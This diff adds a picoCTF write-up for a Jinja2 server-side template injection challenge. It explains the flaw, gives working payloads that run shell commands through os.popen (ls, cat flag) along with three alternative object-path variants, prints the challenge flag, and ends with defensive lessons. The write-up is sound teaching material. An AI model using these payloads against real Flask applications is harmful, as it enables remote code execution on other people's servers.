@@ -1,0 +1,236 @@
+# 🔓 SSTI1 — Writeup
+
+> **Category:** Web Exploitation
+> **Difficulty:** Easy
+> **Vulnerability:** Server-Side Template Injection (SSTI)
+> **Technology:** Jinja2 / Python / Flask
+> **Platform:** picoCTF
+
+---
+
+## 📋 Challenge Overview
+
+The challenge provides a simple input box where user-supplied text is rendered by the server.
+
+The vulnerability is that the application **processes user input as a Jinja2 template instead of treating it as ordinary text**.
+
+This allows us to inject template expressions, execute server-side operations, read files, and ultimately retrieve the flag.
+
+---
+
+## 🎯 What You're Working With
+
+| Property                | Details                       |
+| :---------------------- | :---------------------------- |
+| 🌐 **Application**      | Input box + `Go` button       |
+| 🧩 **Difficulty**       | Easy                          |
+| 🛠️ **Template Engine** | Jinja2                        |
+| 🐍 **Backend**          | Python / Flask                |
+| 🎯 **Objective**        | Exploit SSTI to read the flag |
+
+---
+
+## 🤔 What is SSTI?
+
+**SSTI (Server-Side Template Injection)** occurs when an application processes user-controlled input as part of a server-side template.
+
+For example:
+
+| Normal Application               | Vulnerable Application                   |
+| :------------------------------- | :--------------------------------------- |
+| Input: `Hello` → Output: `Hello` | Input: `{{7*7}}` → Output: `49`          |
+| User input is treated as text    | User input is evaluated as template code |
+
+If `{{7*7}}` returns `49`, the server is evaluating our input.
+
+> 🧠 **Core idea:** Instead of simply displaying our input, the server is interpreting it.
+
+---
+
+# 🔎 Step 1 — Confirm the Vulnerability
+
+Enter the following payload into the input field:
+
+```text
+{{7*7}}
+```
+
+Click **Go**.
+
+### Expected Results
+
+| Input     | Output    | Result                           |
+| :-------- | :-------- | :------------------------------- |
+| `{{7*7}}` | `49`      | ✅ SSTI confirmed                 |
+| `{{7*7}}` | `{{7*7}}` | ❌ Input is being treated as text |
+
+If the application returns:
+
+```text
+49
+```
+
+we have confirmed that the server is evaluating **Jinja2 template expressions**.
+
+---
+
+# 🔑 Step 2 — Identify the Template Engine
+
+The syntax:
+
+```text
+{{ expression }}
+```
+
+is characteristic of Jinja2 and other template engines.
+
+Since this challenge uses a Python/Flask application, Jinja2 provides a useful path toward accessing Python functionality.
+
+The next step is to determine whether we can interact with the underlying operating system.
+
+---
+
+# 📂 Step 3 — List Files on the Server
+
+Use the following payload:
+
+```text
+{{ __import__('os').popen('ls').read() }}
+```
+
+### Payload Breakdown
+
+| Component          | Purpose                                 |
+| :----------------- | :-------------------------------------- |
+| `__import__('os')` | Imports Python's `os` module            |
+| `.popen('ls')`     | Executes the `ls` command               |
+| `.read()`          | Reads the command output                |
+| `{{ ... }}`        | Evaluates the expression through Jinja2 |
+
+The response should contain files similar to:
+
+```text
+flag
+app.py
+...
+```
+
+The important discovery is:
+
+```text
+flag
+```
+
+This indicates that the flag is stored in a file named `flag`.
+
+---
+
+# 💥 Step 4 — Read the Flag
+
+Now we can execute `cat flag` through the same SSTI vulnerability:
+
+```text
+{{ __import__('os').popen('cat flag').read() }}
+```
+
+### Payload Breakdown
+
+| Component            | Purpose                      |
+| :------------------- | :--------------------------- |
+| `__import__('os')`   | Imports the OS module        |
+| `.popen('cat flag')` | Executes `cat flag`          |
+| `.read()`            | Retrieves the command output |
+| `{{ ... }}`          | Evaluates the expression     |
+
+The server response contains the flag.
+
+---
+
+# 🧪 Alternative Payloads
+
+If direct access through `__import__` is restricted, alternative Jinja2/Python object paths can sometimes reach the same functionality.
+
+### Method 1
+
+```text
+{{ config.__class__.__init__.__globals__['os'].popen('cat flag').read() }}
+```
+
+### Method 2
+
+```text
+{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat flag').read() }}
+```
+
+### Method 3
+
+```text
+{{ cycler.__init__.__globals__.os.popen('cat flag').read() }}
+```
+
+These payloads use different object paths to reach Python's `os` functionality.
+
+> ⚠️ **Note:** Exact payload behavior can vary depending on the Jinja2/Flask environment and any restrictions implemented by the challenge.
+
+---
+
+# 🏆 Flag
+
+```text
+picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_f5438664}
+```
+
+> **Flag:** `picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_f5438664}`
+
+---
+
+# 🧠 What Did We Learn?
+
+## 🔴 Vulnerability
+
+The application directly incorporates user-controlled input into a Jinja2 template.
+
+This allows an attacker to inject template expressions and, in this environment, access Python functionality and execute operating-system commands.
+
+---
+
+## 🛡️ Security Lessons
+
+| ✅ Secure Practice                          | ❌ What Went Wrong                                  |
+| :----------------------------------------- | :------------------------------------------------- |
+| Treat user input strictly as data          | User input was interpreted as template code        |
+| Keep user input separate from templates    | Raw input reached the template engine              |
+| Validate and constrain input               | No effective protection against template injection |
+| Avoid exposing dangerous objects/functions | Python functionality became reachable              |
+
+---
+
+# 📌 Attack Chain
+
+```text
+User Input
+    ↓
+{{7*7}}
+    ↓
+SSTI Confirmed
+    ↓
+Access Python functionality
+    ↓
+Execute `ls`
+    ↓
+Discover `flag`
+    ↓
+Execute `cat flag`
+    ↓
+🏆 Retrieve Flag
+```
+
+---
+
+## 🔐 Key Takeaway
+
+> **Never allow untrusted user input to be interpreted as server-side template code.**
+
+Properly separate **data from templates**, apply appropriate validation/escaping, and avoid exposing dangerous objects or functions to template contexts.
+
+**SSTI can escalate from simple template evaluation to server-side code execution and complete application compromise.**
